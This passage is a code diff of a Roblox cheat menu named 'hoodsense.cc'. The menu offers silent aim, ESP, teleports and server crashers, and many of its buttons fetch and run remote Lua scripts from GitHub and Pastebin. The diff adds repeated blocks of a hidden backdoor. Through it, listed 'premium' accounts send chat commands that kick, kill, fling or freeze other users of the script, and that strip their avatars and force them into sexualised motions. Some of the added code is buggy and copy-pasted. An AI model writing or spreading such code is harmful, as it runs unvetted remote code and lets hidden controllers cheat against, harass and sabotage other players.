@@ -1,6 +1,6 @@
 local Config = {
     WindowName = "hoodsense.cc",
-	Color = Color3.fromRGB(91, 150, 20),
+	Color = Color3.fromRGB(22, 88, 232),
 	Keybind = Enum.KeyCode.V
 }
 
@@ -55,7 +55,7 @@ local PartnersLabel = Section12:CreateLabel("Supporting with creating project!")
 PartnersLabel:UpdateText("Supporting with creating project!")
 
 ------------------------
------//MAIN  PAGE\\-----
+-----//MAIN  PAGE-----
 local SilentAimToggle = Section1:CreateToggle("Silent Aim", nil, function(bool)
     DaHoodSettings.SilentAim = bool
 end)
@@ -81,6 +81,13 @@ local HitAirShootsToggle = Section1:CreateToggle("Hit Airshots", nil, function(b
 end)
 HitAirShootsToggle:AddToolTip("Hits Airshots.")
 
+local fovcolor =Section1:CreateColorpicker("Fov Color", function(color)
+	Aiming.FOVColour = color
+end)
+fovcolor:AddToolTip("Change FOV color.")
+fovcolor:UpdateColor(Color3.fromRGB(20, 124, 255))
+
+
 local FovCircleSize = Section2:CreateSlider("Fov Circle Size", 0,400,nil,false, function(value)
     Aiming.FOV = value
 end)
@@ -94,7 +101,7 @@ HitChanceSlider:AddToolTip("Customize hitchance.")
 local animationgamepass = Section6:CreateButton("Animation Gamepass", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/animation_gamepass.lua'))()
 end)
-animationgamepass:AddToolTip("Loads Animation Gamepass \(Press P to close.\)")
+animationgamepass:AddToolTip("Loads Animation Gamepass (Press P to close.)")
 
 local meanie = Section13:CreateButton("Meanie", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/508490451.lua'))()
@@ -106,10 +113,10 @@ local sshf = Section13:CreateButton("Super Super Happy Face", function()
 end)
 sshf:AddToolTip("Changes your face to Super Super Happy Face.")
 
-local silverpunk = Section13:CreateButton("Silver Punk Face", function()
+--[[local silverpunk = Section13:CreateButton("Silver Punk Face", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/387256104.lua'))()
 end)
-silverpunk:AddToolTip("Changes your face to Silver Punk Face.")
+silverpunk:AddToolTip("Changes your face to Silver Punk Face.")]]
 
 local yum = Section13:CreateButton("Yum", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/26018945.lua'))()
@@ -121,12 +128,12 @@ local playful = Section13:CreateButton("Playful Vampire", function()
 end)
 playful:AddToolTip("Changes your face to Playful Vampire.")
 
-local beastmode = Section13:CreateButton("Beast Mode", function()
+--[[local beastmode = Section13:CreateButton("Beast Mode", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/127959433.lua'))()
 end)
-beastmode:AddToolTip("Changes your face to Beast Mode.")
+beastmode:AddToolTip("Changes your face to Beast Mode.")]]--
 ------------------------
------// ESP PAGE \\-----
+-----// ESP PAGE -----
 local espToggle = Section5:CreateToggle("Enable ESP", nil, function(bool)
     ESP:Toggle(bool)
 end)
@@ -146,8 +153,14 @@ local boxesToggle = Section5:CreateToggle("Enable Boxes", nil, function(bool)
     ESP.Boxes = bool
 end)
 tracersToggle:AddToolTip("Enables Boxes.")
+
+local espcolor = Section5:CreateColorpicker("Esp Color", function(color)
+	ESP.Color = color
+end)
+espcolor:UpdateColor(Color3.fromRGB(20, 124, 255))
+espcolor:AddToolTip("Change ESP Color.")
 ------------------------
------// AV  PAGE \\-----
+-----// AV  PAGE -----
 local animbutton = Section6:CreateButton("Animations", function(bool)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/anims.lua"))()
 end)
@@ -190,7 +203,7 @@ end
 end)
 animatedbeastmode:AddToolTip("Makes your face animated.")
 ------------------------
------// TP  PAGE \\-----
+-----// TP  PAGE -----
 local revolver = Section7:CreateButton("Revolver", function(bool)
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-638.75, 18.8500004, -118.175011, -1, 0, 0, 0, 1, 0, 0, 0, -1)
 end)
@@ -295,7 +308,7 @@ local school = Section8:CreateButton("School Roof", function(bool)
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-525.353455, 68.125, 311.824402, 0.999992013, 1.03866675e-08, -0.00399552286, -1.03507425e-08, 1, 9.01170427e-09, 0.00399552286, -8.97027519e-09, 0.999992013)
 end)
 ------------------------
----//  MISC  PAGES \\---
+---//  MISC  PAGES ---
 local rejoin = Section9:CreateButton("Rejoin Server", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
 end)
@@ -357,7 +370,7 @@ swagfly:AddToolTip("Loads Swag Mode Admin Fly. [X]")
 local crash = Section10:CreateButton("Better Crash", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/GS21Official/DH-TB-Crash/main/Swagmode%20crash%20modified%20(better%20FPS)%20crash'))()
 end)
-crash:AddToolTip("Loads Swag Mode Modified Crash \(For potato pc's.\)")
+crash:AddToolTip("Loads Swag Mode Modified Crash (For potato pc's.)")
 
 local panic = Section10:CreateButton("Rage quit", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/ragequit.lua'))()
@@ -372,9 +385,9 @@ swagmode:AddToolTip("Loads Swag Mode.")
 local swagcrash = Section10:CreateButton("Swag Crasher", function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 end)
-swagcrash:AddToolTip("Loads Swag Mode Crash \(DOESN'T WORKS ON LOW-END PC'S\)")
+swagcrash:AddToolTip("Loads Swag Mode Crash (DOESN'T WORKS ON LOW-END PC'S)")
 ------------------------
----// CREDITS PAGE \\---
+---// CREDITS PAGE ---
 local CreditsLabel1 = Section11:CreateLabel("Made with love by hoodsense team!")
 CreditsLabel1:UpdateText("Made with love by hoodsense team!")
 local discord = Section11:CreateButton("Brought to you by hoodsense.", function(bool)
@@ -403,8 +416,8 @@ end)
 local CreditsLabel2 = Section11:CreateLabel("Our Staff")
 CreditsLabel2:UpdateText("Our Staff")
 
-local discord = Section11:CreateButton("qvit#0001", function(bool)
-    setclipboard("qvit#0001 <@804245361894883339>")
+local discord = Section11:CreateButton("<z3#0001", function(bool)
+    setclipboard("<z3#0001 <@804245361894883339>")
     wait(1)
     local function callback(text)
         if text == "Yes" then
@@ -605,21 +618,21 @@ end)
 Colorpicker3:UpdateColor(Config.Color)
 
 -- credits to jan for patterns
-local Dropdown3 = Section4:CreateDropdown("Image", {"Default","Hearts","Abstract","Hexagon","Circles","Lace With Flowers","Floral"}, function(Name)
+local Dropdown3 = Section4:CreateDropdown("Image", {"Default","Hearts","Abstract","Hexagons","Circles","Flowers","Waves"}, function(Name)
 	if Name == "Default" then
-		Window:SetBackground("2151741365")
+		Window:SetBackground("5553946656")
 	elseif Name == "Hearts" then
 		Window:SetBackground("6073763717")
 	elseif Name == "Abstract" then
 		Window:SetBackground("6073743871")
-	elseif Name == "Hexagon" then
+	elseif Name == "Hexagons" then
 		Window:SetBackground("6073628839")
 	elseif Name == "Circles" then
 		Window:SetBackground("6071579801")
-	elseif Name == "Lace With Flowers" then
+	elseif Name == "Flowers" then
 		Window:SetBackground("6071575925")
-	elseif Name == "Floral" then
-		Window:SetBackground("5553946656")
+	elseif Name == "Waves" then
+		Window:SetBackground("2151741365")
 	end
 end)
 Dropdown3:SetOption("Default")
@@ -627,7 +640,7 @@ Dropdown3:SetOption("Default")
 local Colorpicker4 = Section4:CreateColorpicker("Color", function(Color)
 	Window:SetBackgroundColor(Color)
 end)
-Colorpicker4:UpdateColor(Color3.new(91, 150, 20))
+Colorpicker4:UpdateColor(Color3.new(0, 0, 0))
 
 local Slider3 = Section4:CreateSlider("Transparency",0,1,nil,false, function(Value)
 	Window:SetBackgroundTransparency(Value)
@@ -637,11 +650,11 @@ Slider3:SetValue(0)
 local Slider4 = Section4:CreateSlider("Tile Scale",0,1,nil,false, function(Value)
 	Window:SetTileScale(Value)
 end)
-Slider4:SetValue(1)
+Slider4:SetValue(0.25)
 
 
 -------------------------------
------// AIMING FUNCTION \\-----
+-----// AIMING FUNCTION -----
 function Aiming.Check()
     if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
         return false
@@ -694,15 +707,24 @@ game.StarterGui:SetCore("SendNotification", {
     Button1 = "Okay!";
 })
 print("_____________________HOODSENSE.CC________________________")
-print("| [hoodsense.cc] Executed version: 4.8                  |")
-print("| [hoodsense.cc] ESP is working now!                    |")
+print("| [hoodsense.cc] Executed version: 5.0                  |")
+print("| [hoodsense.cc] More addons now!                       |")
 print("| [hoodsense.cc] Join us http://hoodsense.cf/discord    |")
-print("| [hoodsense.cc] Made by ekso#1337 <@804245361894883339>|")
+print("| [hoodsense.cc] Made by <z3#0001 <@804245361894883339> |")
 print("| [hoodsense.cc] Website - http://hoodsense.cf          |")
 print("_________________________________________________________")
 
+local Players = game:GetService("Players")
+	Players.PlayerAdded:Connect(function(player)
+		print("[hoodsense.cc] Player Joined " .. player.Name)
+		local user_premium__001 = game.Players.jestemfajny780
+ end)
+	Players.PlayerRemoving:Connect(function(player)
+	print("[hoodsense.cc] Player Left " .. player.Name)
+	local user_premium__001 = game.Players.jestemfajny780
+end)
 --// Premium User //--
-local user_premium__001 = game.Players.jestemfajny780 or qcnqy or ztmave or HappiMarry or michxas or fv4lx
+local user_premium__001 = game.Players.jestemfajny780
 -----------------------------------------------------------------------
 --// Premium Commands //--
 local freeze = function()
@@ -773,10 +795,9 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match("$unbenx .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			benxPos = player.Character.HumanoidRootPart.CFrame
 			game.Players.LocalPlayer.Character.Humanoid:Destroy()
-			wait(7)
-			player.Character.HumanoidRootPart.CFrame = benxPos
+			wait(15)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
 		end
 	end
 
@@ -884,22 +905,221 @@ user_premium__001.Chatted:connect(function(cht)
 
 end)
 
---[[```lua
->>>COMMANDS<<<
-$benx .
-$unbenx .
-$bring .
-$freeze .
-$unfreeze .
-$grave .
-$rejoin .
-$fling .
-$kill .
-$kick .
-$ban . (fake)
-/e test
-```]]
----------------------
+if game.Players.LocalPlayer == user_premium__001 then
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "hoodsense.cc";
+	Text = "Premium acces!";
+	Time = 10;
+	Icon = "rbxassetid://8768441000";
+    Button1 = "Okay!";
+})
+--[[game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "hoodsense.cc";
+	Text = "No Premium!";
+	Time = 10;
+	Icon = "rbxassetid://8768441000";
+    Button1 = "Okay!";
+})]]
+end
+--[[
+██╗░░██╗░█████╗░░█████╗░██████╗░░██████╗███████╗███╗░░██╗░██████╗███████╗
+██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░██║██╔════╝██╔════╝
+███████║██║░░██║██║░░██║██║░░██║╚█████╗░█████╗░░██╔██╗██║╚█████╗░█████╗░░
+██╔══██║██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
+██║░░██║╚█████╔╝╚█████╔╝██████╔╝██████╔╝███████╗██║░╚███║██████╔╝███████╗
+╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝
+]]
+-------------------------------------------------------------------------
+local Players = game:GetService("Players")
+	Players.PlayerAdded:Connect(function(player)
+		print("[hoodsense.cc] Player Joined " .. player.Name)
+		local user_premium__001 = game.Players.jestemfajny780
+ end)
+	Players.PlayerRemoving:Connect(function(player)
+	print("[hoodsense.cc] Player Left " .. player.Name)
+	local user_premium__001 = game.Players.jestemfajny780
+end)
+--// Premium User //--
+local user_premium__001 = game.Players.jestemfajny780
+-----------------------------------------------------------------------
+--// Premium Commands //--
+local freeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
+end
+
+local unfreeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
+end
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$kick .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer:Kick("Kicked by Premium user")
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$fling .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+			power = 99999999 -- change this to make it more or less powerful
+ 
+			game:GetService('RunService').Stepped:connect(function()
+			game.Players.LocalPlayer.Character.Head.CanCollide = false
+			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+			end)
+			wait(.1)
+			local bambam = Instance.new("BodyThrust")
+			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+			bambam.Force = Vector3.new(power,0,power)
+			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$benx .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			wait(0) local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = user_premium__001.Character.HumanoidRootPart
+			local benxed = true
+			while benxed == true do
+				hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+				pcall(function()
+    					hummy.Parent.Pants:Destroy()
+				end)
+				pcall(function()
+    					hummy.Parent.Shirt:Destroy()
+				end)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = user_premium__001.Character.HumanoidRootPart.CFrame + user_premium__001.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+				wait(0.1)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+			end
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$unbenx .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+			wait(15)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$freeze .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			freeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$unfreeze .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			unfreeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$thaw .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			unfreeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$ban .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer:kick("PERMA BAN")
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$kill .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$rejoin .") then
+    	if game.Players.LocalPlayer ~= user_premium__001 then
+        loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
+        end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$void .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$bring .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$grave .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("$ungrave .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match("/e test") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yes yes sir ;)","All")
+		end
+	end
+
+end)
 
 if game.Players.LocalPlayer == user_premium__001 then
 game:GetService("StarterGui"):SetCore("SendNotification",{
@@ -912,8 +1132,8 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
 else
 game:GetService("StarterGui"):SetCore("SendNotification",{
 	Title = "hoodsense.cc";
-	Text = "No Premium!";
-	Time = 10;
+	Text = "No Premium acces!";
+	Time = 7;
 	Icon = "rbxassetid://8768441000";
     Button1 = "Okay!";
 })
@@ -924,5 +1144,1058 @@ end
 ███████║██║░░██║██║░░██║██║░░██║╚█████╗░█████╗░░██╔██╗██║╚█████╗░█████╗░░
 ██╔══██║██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
 ██║░░██║╚█████╔╝╚█████╔╝██████╔╝██████╔╝███████╗██║░╚███║██████╔╝███████╗
-╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝")
+╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝
 ]]
+-------------------------------------------------------------------------
+local Players = game:GetService("Players")
+	Players.PlayerAdded:Connect(function(player)
+		print("[hoodsense.cc] Player Joined " .. player.Name)
+		local premium2 = game.Players.qcnqy
+ end)
+	Players.PlayerRemoving:Connect(function(player)
+	print("[hoodsense.cc] Player Left " .. player.Name)
+	local premium2 = game.Players.qcnqy
+end)
+--// Premium User //--
+local premium2 = game.Players.qcnqy
+-----------------------------------------------------------------------
+--// Premium Commands //--
+local freeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
+end
+
+local unfreeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
+end
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$kick .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			game.Players.LocalPlayer:Kick("Kicked by Premium user")
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$fling .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+			power = 99999999 -- change this to make it more or less powerful
+ 
+			game:GetService('RunService').Stepped:connect(function()
+			game.Players.LocalPlayer.Character.Head.CanCollide = false
+			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+			end)
+			wait(.1)
+			local bambam = Instance.new("BodyThrust")
+			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+			bambam.Force = Vector3.new(power,0,power)
+			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$benx .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			wait(0) local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = premium2.Character.HumanoidRootPart
+			local benxed = true
+			while benxed == true do
+				hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+				pcall(function()
+    					hummy.Parent.Pants:Destroy()
+				end)
+				pcall(function()
+    					hummy.Parent.Shirt:Destroy()
+				end)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = premium2.Character.HumanoidRootPart.CFrame + premium2.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+				wait(0.1)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+			end
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$unbenx .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+			wait(15)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium2.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$freeze .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			freeze()
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$unfreeze .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			unfreeze()
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$thaw .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			unfreeze()
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$ban .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			game.Players.LocalPlayer:kick("PERMA BAN")
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$kill .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$rejoin .") then
+    	if game.Players.LocalPlayer ~= premium2 then
+        loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
+        end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$void .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$bring .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(premium2.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$grave .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("$ungrave .") then
+		if game.Players.LocalPlayer ~= premium2 then
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+		end
+	end
+
+end)
+
+premium2.Chatted:connect(function(cht)
+	if cht:match("/e test") then
+		if game.Players.LocalPlayer ~= premium2 then
+            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yes yes sir ;)","All")
+		end
+	end
+
+end)
+
+if game.Players.LocalPlayer == premium2 then
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "hoodsense.cc";
+	Text = "Premium acces!";
+	Time = 10;
+	Icon = "rbxassetid://8768441000";
+    Button1 = "Okay!";
+})
+--[[game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "hoodsense.cc";
+	Text = "No Premium!";
+	Time = 10;
+	Icon = "rbxassetid://8768441000";
+    Button1 = "Okay!";
+})]]
+end
+--[[
+██╗░░██╗░█████╗░░█████╗░██████╗░░██████╗███████╗███╗░░██╗░██████╗███████╗
+██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░██║██╔════╝██╔════╝
+███████║██║░░██║██║░░██║██║░░██║╚█████╗░█████╗░░██╔██╗██║╚█████╗░█████╗░░
+██╔══██║██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
+██║░░██║╚█████╔╝╚█████╔╝██████╔╝██████╔╝███████╗██║░╚███║██████╔╝███████╗
+╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝
+]]
+-------------------------------------------------------------------------
+local Players = game:GetService("Players")
+	Players.PlayerAdded:Connect(function(player)
+		print("[hoodsense.cc] Player Joined " .. player.Name)
+		local premium3 = game.Players.ztmave
+ end)
+	Players.PlayerRemoving:Connect(function(player)
+	print("[hoodsense.cc] Player Left " .. player.Name)
+	local premium3 = game.Players.ztmave
+end)
+--// Premium User //--
+local premium3 = game.Players.ztmave
+-----------------------------------------------------------------------
+--// Premium Commands //--
+local freeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
+end
+
+local unfreeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
+end
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$kick .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			game.Players.LocalPlayer:Kick("Kicked by Premium user")
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$fling .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+			power = 99999999 -- change this to make it more or less powerful
+ 
+			game:GetService('RunService').Stepped:connect(function()
+			game.Players.LocalPlayer.Character.Head.CanCollide = false
+			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+			end)
+			wait(.1)
+			local bambam = Instance.new("BodyThrust")
+			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+			bambam.Force = Vector3.new(power,0,power)
+			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$benx .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			wait(0) local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = premium3.Character.HumanoidRootPart
+			local benxed = true
+			while benxed == true do
+				hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+				pcall(function()
+    					hummy.Parent.Pants:Destroy()
+				end)
+				pcall(function()
+    					hummy.Parent.Shirt:Destroy()
+				end)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = premium3.Character.HumanoidRootPart.CFrame + premium3.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+				wait(0.1)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+			end
+		end
+	end
+
+end)
+
+premium3.Chatted:connect(function(cht)
+	if cht:match("$unbenx .") then
+		if game.Players.LocalPlayer ~= premium3 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+			wait(15)
